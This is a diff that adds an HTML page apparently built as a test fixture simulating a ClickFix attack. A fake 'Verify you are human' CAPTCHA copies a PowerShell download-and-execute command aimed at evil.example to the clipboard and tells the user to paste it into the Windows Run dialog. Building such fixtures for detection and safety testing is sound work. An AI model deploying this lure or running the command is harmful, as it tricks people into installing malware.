@@ -1,0 +1,114 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-smartgate'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'" />
+  <title>Smart Prompt Gate</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+    }
+
+    .buttonish {
+      display: inline-block;
+      padding: 10px 14px;
+      border: 1px solid #2463eb;
+      border-radius: 4px;
+      background: #2563eb;
+      color: #fff;
+      cursor: pointer;
+      user-select: none;
+      text-decoration: none;
+      min-width: 180px;
+      text-align: center;
+    }
+
+    .buttonish::before {
+      content: attr(data-label);
+    }
+
+    #fake-captcha-overlay {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0, 0, 0, 0.45);
+      z-index: 10000;
+    }
+
+    #fake-captcha-box {
+      width: 340px;
+      padding: 24px;
+      border-radius: 8px;
+      background: #fff;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
+      text-align: center;
+    }
+
+    #verify-btn {
+      margin-top: 12px;
+      padding: 10px 14px;
+      border: 1px solid #888;
+      border-radius: 4px;
+      background: #f6f6f6;
+      cursor: pointer;
+    }
+
+    #steps-section {
+      display: none;
+      margin-top: 12px;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+  <h1>Smart Prompt Gate</h1>
+
+  <p>
+    <a id="benign-link" class="buttonish" target="_blank" href="/smart-prompt-gate.html?opened=benign" data-label="Open same-site report"></a>
+  </p>
+
+  <p>
+    <button id="arm-clickfix" type="button">Arm ClickFix</button>
+    <a id="risky-link" class="buttonish" target="_blank" href="/smart-prompt-gate.html?opened=risky" data-label="Open same-site risky report"></a>
+  </p>
+
+  <div id="fake-captcha-overlay" aria-hidden="true">
+    <div id="fake-captcha-box">
+      <h2>Verify you are human</h2>
+      <p>Security verification required to continue</p>
+      <button id="verify-btn" type="button">I am not a robot</button>
+      <div id="steps-section">
+        <ol>
+          <li>Press Win+R to open the Run dialog</li>
+          <li>Press Ctrl+V to paste the verification code</li>
+          <li>Press Enter to verify</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <div id="status">idle</div>
+
+  <script nonce="smartgate">
+    const overlay = document.getElementById("fake-captcha-overlay");
+    const steps = document.getElementById("steps-section");
+    const status = document.getElementById("status");
+
+    document.getElementById("arm-clickfix").addEventListener("click", () => {
+      overlay.style.display = "flex";
+      status.textContent = "clickfix-visible";
+    });
+
+    document.getElementById("verify-btn").addEventListener("click", async () => {
+      const command = "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')\"";
+      await navigator.clipboard.writeText(command);
+      steps.style.display = "block";
+      status.textContent = "clickfix-armed";
+    });
+  </script>
+</body>
+</html>
